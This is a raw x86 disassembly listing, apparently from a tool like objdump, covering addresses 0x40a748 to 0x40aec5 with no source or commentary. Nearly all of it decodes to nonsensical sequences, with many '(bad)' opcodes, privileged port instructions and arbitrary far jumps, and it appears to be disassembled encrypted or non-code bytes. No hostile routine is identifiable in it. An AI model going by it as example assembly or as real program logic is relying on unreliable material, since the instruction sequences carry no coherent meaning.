  40a748:	out    0xd9,al
  40a74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a74b:	jmp    0x59ac8915
  40a750:	sub    ebx,DWORD PTR [edx+0x52ea1197]
  40a756:	xchg   edi,eax
  40a757:	xor    ch,cl
  40a759:	test   al,0xc
  40a75b:	shr    BYTE PTR [edi-0x33],0xd0
  40a75f:	and    DWORD PTR [ecx-0x2d],0xe4c48450
  40a766:	sub    edi,DWORD PTR [esi-0x4]
  40a769:	cs jmp 0x2a63:0x3a863add
  40a771:	pop    ebp
  40a772:	inc    esi
  40a773:	mov    ds:0x332a97f7,eax
  40a778:	lock mov ah,0x64
  40a77b:	lock (bad) [edx-0x36]
  40a77f:	or     al,bl
  40a781:	cmp    al,0x74
  40a783:	fldenv [ebx-0x77]
  40a786:	push   es
  40a787:	mov    ds:0x78cab6d,eax
  40a78c:	add    ch,BYTE PTR [edx]
  40a78e:	fdivr  st,st(1)
  40a790:	je     0x40a774
  40a792:	or     al,0x3b
  40a794:	jge    0x40a7ee
  40a796:	mov    bh,0xea
  40a798:	jge    0x40a7ff
  40a79a:	add    DWORD PTR [esi+0x1a],ecx
  40a79d:	and    DWORD PTR [edi-0x3ab45a5e],ebx
  40a7a3:	and    ebp,DWORD PTR [edx-0x5]
  40a7a6:	mov    bh,0x64
  40a7a8:	lock cmp al,ch
  40a7ab:	inc    esp
  40a7ac:	dec    ebp
  40a7ad:	sbb    DWORD PTR [edi-0x1e],edi
  40a7b0:	sbb    bl,ah
  40a7b2:	daa    
  40a7b3:	inc    esi
  40a7b4:	jmp    0xb5dd03ec
  40a7b9:	es dec ebx
  40a7bb:	mov    al,0xa2
  40a7bd:	es fwait
  40a7bf:	xor    esi,DWORD PTR [esi+0x1d]
  40a7c2:	retf   0x932d
  40a7c5:	iret   
  40a7c6:	ror    DWORD PTR [ecx+0x1cb82259],0x18
  40a7cd:	out    0x18,eax
  40a7cf:	xchg   ebp,eax
  40a7d0:	mov    ds:0x3108f1b7,al
  40a7d5:	xor    eax,esp
  40a7d7:	mov    ds:0xbbdcc5c9,eax
  40a7dc:	or     eax,DWORD PTR [ebx*8-0x1833d802]
  40a7e3:	or     BYTE PTR [ebx+0x77],al
  40a7e6:	and    eax,0xbea75ceb
  40a7eb:	jb     0x40a7f9
  40a7ed:	fisubr DWORD PTR [edx+edi*4+0x30300297]
  40a7f4:	jo     0x40a82d
  40a7f6:	test   DWORD PTR [ebx+0x6af45d7f],edx
  40a7fc:	push   0xfffffff3
  40a7fe:	mov    dl,BYTE PTR [ecx-0xc]
  40a801:	mov    DWORD PTR [ebx+0x1b],ebx
  40a804:	icebp  
  40a805:	pusha  
  40a806:	cwde   
  40a807:	test   eax,0xc6d1b7ce
  40a80c:	push   ebp
  40a80d:	mov    ds:0xfb2586e2,al
  40a812:	pop    ebx
  40a813:	push   ebp
  40a814:	dec    eax
  40a815:	xor    edi,DWORD PTR [edx*1-0x1043d0e6]
  40a81c:	ins    BYTE PTR es:[edi],dx
  40a81d:	mov    esi,0xf5020167
  40a822:	scas   eax,DWORD PTR es:[edi]
  40a823:	mov    es,eax
  40a825:	retf   0xd666
  40a828:	adc    DWORD PTR [ebp+0x32],edx
  40a82b:	mov    esi,0xdb45895c
  40a830:	inc    eax
  40a831:	adc    esi,DWORD PTR [esi]
  40a833:	cmp    ecx,edx
  40a835:	add    BYTE PTR [eax-0x5f],dl
  40a838:	enter  0x43c4,0x8d
  40a83c:	rcl    ecx,0x68
  40a83f:	pushf  
  40a840:	fst    DWORD PTR [eax+0x76900ebd]
  40a846:	inc    eax
  40a847:	les    esi,FWORD PTR [edi+edi*4]
  40a84a:	(bad)  
  40a84b:	fidivr DWORD PTR [edi+esi*2-0x11c762c2]
  40a852:	iret   
  40a853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a854:	sub    BYTE PTR ds:0xa72c022a,cl
  40a85a:	or     BYTE PTR [edi+0x25],bh
  40a85d:	lahf   
  40a85e:	xchg   edx,eax
  40a85f:	shr    BYTE PTR [edx+esi*4-0x7355e8d3],cl
  40a866:	aaa    
  40a867:	inc    ecx
  40a868:	fild   DWORD PTR [edx]
  40a86a:	dec    edx
  40a86b:	push   0x51
  40a86d:	fist   WORD PTR [eax+0x17]
  40a870:	(bad)  
  40a871:	and    esp,DWORD PTR fs:[ecx+0x47]
  40a875:	xchg   esi,eax
  40a876:	shl    DWORD PTR [ecx+0x1c0554c1],0x8a
  40a87d:	addr16 pop esi
  40a87f:	aas    
  40a880:	iret   
  40a881:	push   ebx
  40a882:	or     BYTE PTR [eax+0x196e6187],ch
  40a888:	sti    
  40a889:	dec    esp
  40a88a:	jne    0x40a8a1
  40a88c:	fwait
  40a88d:	neg    ebp
  40a88f:	mov    cl,0xc7
  40a891:	fsubrp st(7),st
  40a893:	int3   
  40a894:	xchg   ebx,eax
  40a895:	enter  0x7f40,0xff
  40a899:	xchg   edx,eax
  40a89a:	test   DWORD PTR [ebp+0x5b6c428b],esp
  40a8a0:	add    DWORD PTR [edx],esi
  40a8a2:	ds cmp ah,BYTE PTR ss:[edi-0x57]
  40a8a7:	sti    
  40a8a8:	mov    esp,0xfcbb0a1f
  40a8ad:	xlat   BYTE PTR ds:[ebx]
  40a8ae:	(bad)
  40a8b1:	or     eax,0xd1132309
  40a8b6:	popa   
  40a8b7:	add    ebx,DWORD PTR [ebp+0x485d01b9]
  40a8bd:	dec    ecx
  40a8be:	and    BYTE PTR [ebp+0x5a8a4c61],dl
  40a8c4:	inc    ebx
  40a8c5:	int3   
  40a8c6:	popa   
  40a8c7:	fdiv   QWORD PTR [esi-0x481699f9]
  40a8cd:	inc    ebp
  40a8ce:	dec    ebp
  40a8cf:	or     al,BYTE PTR gs:[esi+eiz*4]
  40a8d3:	mov    cl,0x96
  40a8d5:	mov    edi,0xf03998a4
  40a8da:	(bad)  
  40a8db:	aas    
  40a8dc:	mov    es,WORD PTR [edi]
  40a8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8df:	or     al,0xd4
  40a8e1:	retf   0x54e8
  40a8e4:	retf   
  40a8e5:	call   0xad98895e
  40a8ea:	add    eax,0x7c7f33a9
  40a8ef:	sahf   
  40a8f0:	pusha  
  40a8f1:	jns    0x40a8d6
  40a8f3:	inc    esi
  40a8f4:	(bad)  
  40a8f5:	mov    ch,0x36
  40a8f7:	jnp    0x40a8bb
  40a8f9:	stos   BYTE PTR es:[edi],al
  40a8fa:	mov    edi,0x222d76d7
  40a8ff:	or     dh,BYTE PTR [edx+0x7e82a44d]
  40a905:	sbb    DWORD PTR [ebp+0x25],ebp
  40a908:	jo     0x40a928
  40a90a:	sub    eax,0x8a0e8a91
  40a90f:	(bad)  
  40a910:	cmc    
  40a911:	les    ecx,FWORD PTR [ecx]
  40a913:	inc    ebp
  40a914:	aad    0xb6
  40a916:	fisttp QWORD PTR [edx+0xb]
  40a919:	lods   al,BYTE PTR ds:[esi]
  40a91a:	sub    al,cl
  40a91c:	(bad)  
  40a91d:	pop    edi
  40a91e:	sbb    dh,dh
  40a920:	pop    ebx
  40a921:	loope  0x40a950
  40a923:	and    al,BYTE PTR [eax]
  40a925:	xor    esi,esp
  40a927:	pop    ds
  40a928:	test   BYTE PTR [ebp-0x333923a],ah
  40a92e:	clc    
  40a92f:	imul   edi,DWORD PTR [ecx-0x19c1258d],0x877eb5ce
  40a939:	popa   
  40a93a:	sbb    DWORD PTR [ebx+eiz*4+0x4428bcea],eax
  40a941:	shl    DWORD PTR [ecx+0x21697ef6],cl
  40a947:	in     al,0xec
  40a949:	push   ebp
  40a94a:	push   ds
  40a94b:	mov    ebp,0x6e0a1ab5
  40a950:	dec    edx
  40a951:	inc    esp
  40a952:	jge    0x40a987
  40a954:	pop    ds
  40a955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a956:	xchg   ebp,eax
  40a957:	jg     0x40a9be
  40a959:	sbb    BYTE PTR [edi+0x45cf3ef0],0xc9
  40a960:	push   esp
  40a961:	jb     0x40a9c1
  40a963:	lods   eax,DWORD PTR ds:[esi]
  40a964:	call   0xafdaa1e6
  40a969:	inc    eax
  40a96a:	lahf   
  40a96b:	daa    
  40a96c:	push   ebp
  40a96d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a96e:	sbb    bh,bl
  40a970:	inc    esi
  40a971:	imul   ebp,ebx,0x35377386
  40a977:	popf   
  40a978:	jmp    0x89a7edb
  40a97d:	out    0x1e,al
  40a97f:	les    ecx,FWORD PTR [ebx]
  40a981:	inc    esi
  40a982:	cmp    dl,BYTE PTR [edi+esi*4+0x40]
  40a986:	leave  
  40a987:	ins    BYTE PTR es:[edi],dx
  40a988:	pop    esi
  40a989:	sub    edi,ebx
  40a98b:	adc    al,0x7a
  40a98d:	or     al,0x25
  40a98f:	mov    ecx,0x4a29b01d
  40a994:	and    dl,BYTE PTR [edx-0x2fc70b0b]
  40a99a:	shl    BYTE PTR [eax+edi*1-0x3b53b4de],0x89
  40a9a2:	repnz inc esi
  40a9a4:	lahf   
  40a9a5:	and    al,ch
  40a9a7:	aaa    
  40a9a8:	push   es
  40a9a9:	xor    BYTE PTR ds:0x757641d9,ch
  40a9af:	retf   0x96cf
  40a9b2:	daa    
  40a9b3:	out    0x53,al
  40a9b5:	imul   ebx,eax,0xffffffb3
  40a9b8:	fnstcw WORD PTR [edx+0x5dcab06a]
  40a9be:	inc    esp
  40a9bf:	mov    ds:0xcfaedb9e,al
  40a9c4:	mov    al,0x9e
  40a9c6:	pop    eax
  40a9c7:	dec    ecx
  40a9c8:	scas   eax,DWORD PTR es:[edi]
  40a9c9:	or     al,0x3c
  40a9cb:	daa    
  40a9cc:	shl    dl,0xa5
  40a9cf:	xor    eax,0x54dc7c9b
  40a9d4:	cwde   
  40a9d5:	bound  ebp,QWORD PTR [esi]
  40a9d7:	mov    al,0x5c
  40a9d9:	mov    esi,0xc0fb81fd
  40a9de:	jo     0x40a9db
  40a9e0:	sub    dl,BYTE PTR [ebp+0x2d]
  40a9e3:	mov    edx,0x7b921e13
  40a9e8:	imul   eax,DWORD PTR [ecx+0x45],0x63
  40a9ec:	sub    dh,dh
  40a9ee:	jno    0x40a9aa
  40a9f0:	push   eax
  40a9f1:	out    0xe6,al
  40a9f3:	pop    ebp
  40a9f4:	sub    edi,DWORD PTR [ebx+0x5b8e90b8]
  40a9fa:	cld    
  40a9fb:	imul   ebp,DWORD PTR [ebx],0xffffffc9
  40a9fe:	jmp    0x40aa18
  40aa00:	mov    ecx,0x7bf5901a
  40aa05:	and    DWORD PTR [ebp-0x6e],edx
  40aa08:	lods   eax,DWORD PTR ds:[esi]
  40aa09:	push   0x29
  40aa0b:	mov    dh,0x1f
  40aa0d:	stc    
  40aa0e:	add    eax,0x5d3027cc
  40aa13:	aaa    
  40aa14:	jno    0x40a99b
  40aa16:	outs   dx,DWORD PTR ds:[esi]
  40aa17:	mov    eax,0x25bac222
  40aa1c:	cs mov eax,0x8fd8bd4d
  40aa22:	dec    ebp
  40aa23:	cmp    BYTE PTR [edx-0x55525dbf],ah
  40aa29:	enter  0xe11b,0xab
  40aa2d:	sub    edx,0x30
  40aa30:	aas    
  40aa31:	iret   
  40aa32:	jecxz  0x40aa07
  40aa34:	jno    0x40aaa1
  40aa36:	xchg   edx,eax
  40aa37:	jo     0x40a9e3
  40aa39:	jmp    0x9d98:0x28652b3e
  40aa40:	add    edx,DWORD PTR [esi+0x61]
  40aa43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa44:	out    dx,eax
  40aa45:	arpl   WORD PTR [eax],ax
  40aa47:	sbb    eax,0x33bb7a7c
  40aa4c:	fidiv  DWORD PTR [edi+ecx*1]
  40aa4f:	pop    ecx
  40aa50:	mov    ebx,0x1d254de5
  40aa55:	nop
  40aa56:	mov    dh,0x44
  40aa58:	jg     0x40aa6e
  40aa5a:	inc    esi
  40aa5b:	pusha  
  40aa5c:	adc    DWORD PTR [ecx+0x51fe06cb],ebp
  40aa62:	loopne 0x40aa75
  40aa64:	add    al,0x88
  40aa66:	lods   al,BYTE PTR ds:[esi]
  40aa67:	jecxz  0x40aae4
  40aa69:	bound  edx,QWORD PTR [edx+0x8]
  40aa6c:	mov    BYTE PTR [ebx+0x34],al
  40aa6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa70:	mov    al,ds:0xdf0a11b9
  40aa75:	cs mov ah,0xe3
  40aa78:	pop    ebx
  40aa79:	and    al,0x76
  40aa7b:	lea    edx,[ecx+0x4c]
  40aa7e:	cwde   
  40aa7f:	shl    DWORD PTR [edi],1
  40aa81:	cdq    
  40aa82:	sbb    al,ah
  40aa84:	xor    al,0xdd
  40aa86:	scas   eax,DWORD PTR es:[edi]
  40aa87:	call   0xa76e:0xf42a7553
  40aa8e:	inc    esp
  40aa8f:	jbe    0x40aac4
  40aa91:	sar    DWORD PTR [edx+0x3272db],0x3
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x1a8616bc
  40aacc:	dec    ecx
  40aacd:	push   esp
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x27]
  40aad6:	int    0xfd
  40aad8:	xchg   esp,eax
  40aad9:	pusha  
  40aada:	xor    ebx,DWORD PTR [ecx-0x78bcdfab]
  40aae0:	stos   BYTE PTR es:[edi],al
  40aae1:	(bad)  
  40aae2:	xchg   ebp,eax
  40aae3:	jmp    0x335d:0x7b10b65f
  40aaea:	stos   DWORD PTR es:[edi],eax
  40aaeb:	sub    BYTE PTR [ebx+0x688f0c1c],cl
  40aaf1:	daa    
  40aaf2:	inc    ebx
  40aaf3:	dec    ebx
  40aaf4:	mov    ds:0x2e6f23df,eax
  40aaf9:	je     0x40aaaf
  40aafb:	loop   0x40ab58
  40aafd:	push   esi
  40aafe:	inc    edx
  40aaff:	in     al,0xea
  40ab01:	cmp    ebx,edx
  40ab03:	push   ebx
  40ab04:	mov    ecx,0x5778aece
  40ab09:	dec    ebx
  40ab0a:	sub    BYTE PTR [esi+0x4a],ch
  40ab0d:	mov    ebp,0x943c89
  40ab12:	adc    DWORD PTR [esi+0x33],0x64
  40ab16:	push   ds
  40ab17:	(bad)  
  40ab18:	dec    esi
  40ab19:	lahf   
  40ab1a:	adc    bl,BYTE PTR [ecx+ecx*2-0xb3a2849]
  40ab21:	pop    ebp
  40ab22:	xchg   ebp,eax
  40ab23:	adc    edx,esi
  40ab25:	xor    al,cl
  40ab27:	popa   
  40ab28:	jns    0x40ab48
  40ab2a:	jns    0x40ab13
  40ab2c:	mov    al,BYTE PTR [eax]
  40ab2e:	ss and eax,0x1c536b71
  40ab34:	dec    edx
  40ab35:	dec    ecx
  40ab36:	sbb    BYTE PTR [eax-0x70307c75],0x52
  40ab3d:	aad    0x63
  40ab3f:	dec    esp
  40ab40:	push   0x5d
  40ab42:	and    cl,BYTE PTR [eax+0x4ae2e038]
  40ab48:	gs repz inc esi
  40ab4b:	mov    esi,0x85f09463
  40ab50:	in     eax,dx
  40ab51:	cmp    bl,cl
  40ab53:	adc    ebp,DWORD PTR [bx]
  40ab56:	pop    ecx
  40ab57:	push   0x2b3a95e6
  40ab5c:	cmc    
  40ab5d:	mov    esi,0x94a03860
  40ab62:	stos   DWORD PTR es:[edi],eax
  40ab63:	test   DWORD PTR [ecx+0x328df042],ecx
  40ab69:	push   ss
  40ab6a:	mov    ah,0x69
  40ab6c:	test   eax,0x687749cc
  40ab71:	fisttp DWORD PTR [edi]
  40ab73:	inc    edi
  40ab74:	sub    BYTE PTR [ebx],dh
  40ab76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab77:	xchg   BYTE PTR [ebx],dl
  40ab79:	mov    eax,0x713ede07
  40ab7e:	push   ebp
  40ab7f:	into   
  40ab80:	pop    ecx
  40ab81:	cmp    eax,0x4700cee0
  40ab86:	or     edi,esi
  40ab88:	test   BYTE PTR [ebx+0x6eec06ce],bl
  40ab8e:	es scas al,BYTE PTR es:[edi]
  40ab90:	fstp   DWORD PTR [ebp-0x72]
  40ab93:	mov    edi,0x7e06628e
  40ab98:	sub    dh,bh
  40ab9a:	repnz std 
  40ab9c:	ja     0x40ab2e
  40ab9e:	jge    0x40ab50
  40aba0:	fisttp QWORD PTR [esi-0x21]
  40aba3:	loop   0x40ab37
  40aba5:	sbb    BYTE PTR [ebx+0x30],dl
  40aba8:	or     bl,dl
  40abaa:	mov    db3,ecx
  40abad:	jmp    0x40ab8c
  40abaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb0:	xchg   ebp,eax
  40abb1:	and    DWORD PTR [ebx],eax
  40abb3:	adc    dh,BYTE PTR [ebx+ecx*4+0x772f644]
  40abba:	mov    dh,0xb8
  40abbc:	push   ebp
  40abbd:	xor    esp,DWORD PTR [edi]
  40abbf:	outs   dx,DWORD PTR ds:[esi]
  40abc0:	mov    bl,0x6b
  40abc2:	call   0x7e38:0x7a910cf0
  40abc9:	push   ebp
  40abca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abcb:	xor    dl,cl
  40abcd:	mov    dh,0xf3
  40abcf:	fisttp WORD PTR [ebx+0x18]
  40abd2:	clc    
  40abd3:	ins    BYTE PTR es:[edi],dx
  40abd4:	icebp  
  40abd5:	sub    BYTE PTR [edi],bh
  40abd7:	inc    BYTE PTR [ebp+0x3a75421e]
  40abdd:	adc    BYTE PTR [ebx+0x3f],dl
  40abe0:	xchg   DWORD PTR [eax-0x6d175d0c],edi
  40abe6:	fild   QWORD PTR [edi]
  40abe8:	ja     0x40abbf
  40abea:	iret   
  40abeb:	mov    ds:0xd0ef2fc7,al
  40abf0:	inc    ecx
  40abf1:	and    bh,BYTE PTR [edx+0x0]
  40abf4:	les    ebp,FWORD PTR [eax-0x2b]
  40abf7:	cdq    
  40abf8:	(bad)  
  40abf9:	mov    WORD PTR [edx],ss
  40abfb:	xor    edx,edx
  40abfd:	ins    DWORD PTR es:[edi],dx
  40abfe:	(bad)  
  40ac00:	and    bh,bl
  40ac02:	cwde   
  40ac03:	idiv   DWORD PTR [eax+ebx*8]
  40ac06:	lds    ecx,FWORD PTR [edx+eiz*4]
  40ac09:	mov    edx,DWORD PTR [edi]
  40ac0b:	xchg   ebp,eax
  40ac0c:	add    bh,BYTE PTR [edi-0x46]
  40ac0f:	cmp    al,BYTE PTR [edx]
  40ac11:	xchg   esi,eax
  40ac12:	mov    ah,0xc6
  40ac14:	out    0x94,al
  40ac16:	cli    
  40ac17:	inc    ebx
  40ac18:	mov    dl,0x16
  40ac1a:	mov    WORD PTR [ebx-0x41],cs
  40ac1d:	aas    
  40ac1e:	mov    edx,DWORD PTR [edi-0x23d22180]
  40ac24:	mov    cl,0x44
  40ac26:	jo     0x40ac66
  40ac28:	or     al,0x6c
  40ac2a:	cmp    BYTE PTR [esi-0x7e],ah
  40ac2d:	add    ecx,ebx
  40ac2f:	sub    BYTE PTR [ebp-0x10bb790c],dl
  40ac35:	add    DWORD PTR [eax],ecx
  40ac37:	sahf   
  40ac38:	cs or  ebx,ecx
  40ac3b:	(bad)  
  40ac3c:	pop    ds
  40ac3d:	dec    edi
  40ac3e:	mov    ebx,0x57055f4
  40ac43:	sub    esi,DWORD PTR [ecx-0x597e4541]
  40ac49:	jp     0x40ac97
  40ac4b:	mov    bh,0x37
  40ac4d:	xchg   BYTE PTR [esi],dh
  40ac4f:	sahf   
  40ac50:	enter  0x27b1,0x4f
  40ac54:	xchg   edx,eax
  40ac55:	packssdw mm4,QWORD PTR [ebx-0x5e148c38]
  40ac5c:	jmp    0x40acae
  40ac5e:	lods   eax,DWORD PTR ds:[esi]
  40ac5f:	aaa    
  40ac60:	or     ah,BYTE PTR [ecx]
  40ac62:	jmp    0x1c24:0xfb965704
  40ac69:	push   ecx
  40ac6a:	rcl    DWORD PTR [ebp+0x51d47a69],0x4a
  40ac71:	xor    DWORD PTR [esi],ebx
  40ac73:	mov    edi,0xc4fc1bcb
  40ac78:	and    bl,BYTE PTR [esp+edi*1]
  40ac7b:	imul   ecx,DWORD PTR [edi+0xb],0xffffffa2
  40ac7f:	iret   
  40ac80:	in     al,dx
  40ac81:	and    DWORD PTR [edx],0x3e
  40ac84:	mov    al,ds:0x78918a8d
  40ac89:	(bad)  
  40ac8a:	cli    
  40ac8b:	sbb    BYTE PTR [edx-0x3e1f4541],dl
  40ac91:	jmp    DWORD PTR [ebx]
  40ac93:	outs   dx,BYTE PTR ds:[esi]
  40ac94:	and    eax,esp
  40ac96:	inc    ebp
  40ac97:	ins    DWORD PTR es:[edi],dx
  40ac98:	nop    DWORD PTR [edx]
  40ac9b:	adc    dh,BYTE PTR [ebx-0x5a]
  40ac9e:	sub    eax,0x580c8068
  40aca3:	inc    eax
  40aca4:	lahf   
  40aca5:	outs   dx,BYTE PTR ds:[esi]
  40aca6:	cld    
  40aca7:	cmp    edx,DWORD PTR [edi-0x64]
  40acaa:	retf   
  40acab:	adc    BYTE PTR ds:0x7245fc16,dl
  40acb1:	dec    esp
  40acb2:	ds pushf 
  40acb4:	push   es
  40acb5:	rcr    ah,0x32
  40acb8:	sub    eax,0xeb5d0fa7
  40acbd:	jg     0x40ac59
  40acbf:	mov    ds:0xf851a80f,eax
  40acc4:	pushf  
  40acc5:	mov    edx,0xc6671a17
  40acca:	ja     0x40ac58
  40accc:	in     al,dx
  40accd:	dec    esp
  40acce:	lahf   
  40accf:	ficomp DWORD PTR [edx-0x20436b1a]
  40acd5:	addr16 sub eax,ecx
  40acd8:	jb     0x40aced
  40acda:	int    0xb1
  40acdc:	xor    BYTE PTR [ebx+0x1e],dl
  40acdf:	inc    ecx
  40ace0:	sub    al,0x58
  40ace2:	retf   0x363b
  40ace5:	sbb    esp,ecx
  40ace7:	and    DWORD PTR [edx],edi
  40ace9:	test   eax,0x1e31c71b
  40acee:	push   ds
  40acef:	add    esi,DWORD PTR [esi-0x1b]
  40acf2:	hlt    
  40acf3:	mul    DWORD PTR [ecx+0xc97e2de]
  40acf9:	into   
  40acfa:	cmp    eax,0xa6b1e9cb
  40acff:	mov    esp,0x6869975b
  40ad04:	xchg   ebx,esp
  40ad06:	push   edx
  40ad07:	aas    
  40ad08:	or     edx,DWORD PTR [edx+0x5f7249bc]
  40ad0e:	fdivr  st,st(0)
  40ad10:	sub    ch,BYTE PTR [eax-0x64]
  40ad13:	scas   eax,DWORD PTR es:[edi]
  40ad14:	add    eax,DWORD PTR [ebp+0x5acba8fb]
  40ad1a:	(bad)  
  40ad1b:	mov    edx,0x9e69b399
  40ad20:	sahf   
  40ad21:	scas   al,BYTE PTR es:[edi]
  40ad22:	ins    BYTE PTR es:[edi],dx
  40ad23:	mov    edi,0x49f41b97
  40ad28:	jne    0x40ad23
  40ad2a:	(bad)  
  40ad2c:	push   eax
  40ad2d:	ficom  WORD PTR [eax-0xb]
  40ad30:	enter  0x68a8,0x26
  40ad34:	inc    eax
  40ad35:	jle    0x40ad47
  40ad37:	mov    dl,0xe8
  40ad39:	test   BYTE PTR [eax+0x64],0xad
  40ad3d:	or     DWORD PTR [edi-0x55],0x26e29f61
  40ad44:	and    BYTE PTR [ecx-0x56],bl
  40ad47:	dec    esi
  40ad48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad49:	mov    WORD PTR [ecx],ds
  40ad4b:	dec    esp
  40ad4c:	push   cs
  40ad4d:	mov    DWORD PTR [edi+0x6506bfc3],edx
  40ad53:	lock mov ecx,0x3e23dd43
  40ad59:	add    eax,0x2d9d109d
  40ad5e:	xchg   DWORD PTR [esi+0xb7b7809],ecx
  40ad64:	fist   DWORD PTR [ecx+edi*2]
  40ad67:	fadd   st(1),st
  40ad69:	lahf   
  40ad6a:	jnp    0x40adea
  40ad6c:	mul    DWORD PTR [eax+0x1f]
  40ad6f:	mov    esp,0x813755c1
  40ad74:	or     edi,DWORD PTR [ecx+0x27]
  40ad77:	add    BYTE PTR ds:0x313e6245,cl
  40ad7d:	int    0x40
  40ad7f:	lahf   
  40ad80:	addr16 inc edx
  40ad82:	cmc    
  40ad83:	push   cs
  40ad84:	jno    0x40ad91
  40ad86:	(bad)  
  40ad87:	sub    al,0x95
  40ad89:	or     eax,0x933c5d0d
  40ad8e:	(bad)  
  40ad8f:	mov    ebp,esp
  40ad91:	adc    al,0xbc
  40ad93:	xor    BYTE PTR ds:0x95f9d650,ah
  40ad99:	cld    
  40ad9a:	mov    ebx,0x9de3798b
  40ad9f:	int3   
  40ada0:	bound  edx,QWORD PTR [edx]
  40ada2:	stos   DWORD PTR es:[edi],eax
  40ada3:	inc    ebx
  40ada4:	loope  0x40ad97
  40ada6:	(bad)  
  40ada8:	jmp    0x5f9d618f
  40adad:	push   ebx
  40adae:	test   DWORD PTR [ebx-0x136abf13],esi
  40adb4:	js     0x40ad7b
  40adb6:	dec    eax
  40adb7:	push   es
  40adb8:	mov    cl,0xe3
  40adba:	dec    ecx
  40adbb:	sar    DWORD PTR [esi-0x67],1
  40adbe:	sbb    DWORD PTR [esi+ebx*4],ebx
  40adc1:	je     0x40ad6f
  40adc3:	jl     0x40adf3
  40adc5:	add    BYTE PTR [ebx+eax*4-0x6e6db699],ch
  40adcc:	and    dh,dh
  40adce:	sbb    al,0xbb
  40add0:	dec    esi
  40add1:	or     ah,BYTE PTR [ebp-0xae01969]
  40add7:	(bad)  
  40add8:	fsubr  st(4),st
  40adda:	(bad)  
  40addc:	mov    ds:0xd68e5b43,eax
  40ade1:	cmp    cl,ah
  40ade3:	jle    0x40ad8a
  40ade5:	mov    bl,0xe2
  40ade7:	and    eax,0x473d2b9f
  40adec:	call   0x8e7e:0xf9e553da
  40adf3:	and    ebx,DWORD PTR [eax+0x6664c888]
  40adf9:	repz lea eax,[ebx]
  40adfc:	pusha  
  40adfd:	out    dx,al
  40adfe:	cmp    eax,0x1401886
  40ae03:	adc    edi,eax
  40ae05:	push   edi
  40ae06:	xor    ch,bl
  40ae08:	addr16 test al,0x87
  40ae0b:	dec    eax
  40ae0c:	cdq    
  40ae0d:	(bad)  
  40ae0e:	aaa    
  40ae0f:	mov    ah,0xc1
  40ae11:	pop    esi
  40ae12:	dec    eax
  40ae13:	sub    dh,BYTE PTR [esi-0x21371b3c]
  40ae19:	fcmovb st,st(4)
  40ae1b:	enter  0xd2ad,0xb3
  40ae1f:	xor    eax,0x732140b1
  40ae24:	test   BYTE PTR [edi+0x58],ch
  40ae27:	jb     0x40ae8d
  40ae29:	jae    0x40add9
  40ae2b:	sub    eax,0xe1ed1918
  40ae30:	leave  
  40ae31:	jb     0x40ae16
  40ae33:	int    0xc8
  40ae35:	mov    cl,0xca
  40ae37:	or     BYTE PTR [edi+ebp*2-0x24],bh
  40ae3b:	mov    ecx,0xd7371ac4
  40ae40:	gs ds call 0x6caa:0xf20b293d
  40ae49:	pop    es
  40ae4a:	cli    
  40ae4b:	adc    eax,0x63b49001
  40ae50:	sbb    DWORD PTR [esi],0x33c777f8
  40ae56:	xlat   BYTE PTR ds:[ebx]
  40ae57:	add    dl,dh
  40ae59:	or     DWORD PTR [edx+0x70a49f4c],ecx
  40ae5f:	xchg   ecx,eax
  40ae60:	fwait
  40ae61:	cmp    ecx,ebx
  40ae63:	aas    
  40ae64:	pushf  
  40ae65:	popa   
  40ae66:	scas   al,BYTE PTR es:[edi]
  40ae67:	into   
  40ae68:	dec    eax
  40ae69:	mov    eax,0x2ec6d801
  40ae6e:	xchg   edi,eax
  40ae6f:	leave  
  40ae70:	out    0xba,eax
  40ae72:	dec    edx
  40ae73:	and    al,0x21
  40ae75:	(bad)  
  40ae76:	sbb    eax,0xe817953f
  40ae7b:	in     al,dx
  40ae7c:	xor    eax,0x184eed60
  40ae81:	shr    bh,0x36
  40ae84:	inc    edi
  40ae85:	push   esi
  40ae86:	ror    BYTE PTR [ebx-0x7638733a],1
  40ae8c:	sar    BYTE PTR [eax],0x58
  40ae8f:	pop    ebx
  40ae90:	jecxz  0x40aead
  40ae92:	sbb    edx,DWORD PTR [ecx+0x5a512392]
  40ae98:	idiv   DWORD PTR [esi-0x4bd03010]
  40ae9e:	pusha  
  40ae9f:	cli    
  40aea0:	std    
  40aea1:	out    dx,al
  40aea2:	faddp  st(3),st
  40aea4:	fimul  DWORD PTR ds:0x49573fb1
  40aeaa:	xchg   edx,eax
  40aeab:	sub    dh,ch
  40aead:	lods   eax,DWORD PTR ds:[esi]
  40aeae:	mov    ch,BYTE PTR [ecx-0x1f]
  40aeb1:	jp     0x40aee5
  40aeb3:	sub    dh,dh
  40aeb5:	addr16 sti 
  40aeb7:	xchg   DWORD PTR [ebp-0x5],edi
  40aeba:	mov    DWORD PTR [edx],esi
  40aebc:	fmul   st(7),st
  40aebe:	scas   eax,DWORD PTR es:[edi]
  40aebf:	stc    
  40aec0:	mov    BYTE PTR [esi],bl
  40aec2:	mov    dl,dl
  40aec4:	hlt    
  40aec5:	fwait
